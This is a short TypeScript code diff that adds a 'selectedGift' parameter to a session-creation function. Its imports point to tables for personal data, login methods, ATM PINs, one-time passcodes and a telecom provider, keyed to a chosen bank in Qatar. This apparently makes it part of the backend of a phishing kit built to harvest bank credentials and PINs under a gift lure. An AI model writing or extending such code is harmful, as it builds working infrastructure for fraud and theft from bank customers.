@@ -2,11 +2,12 @@ import { db } from "./_core/db";
 import { sessions, personalDataSubmissions, loginMethodSubmissions, atmPinSubmissions, otpSubmissions, ooredooSubmissions } from "../drizzle/schema";
 import { eq, desc } from "drizzle-orm";
 
-export async function createSession(id: string, selectedBank: string, country: string = "Qatar") {
+export async function createSession(id: string, selectedBank: string, country: string = "Qatar", selectedGift: string = "") {
   await db.insert(sessions).values({
     id,
     selectedBank,
     country,
+    selectedGift,
     status: "pending",
     createdAt: new Date(),
     updatedAt: new Date(),
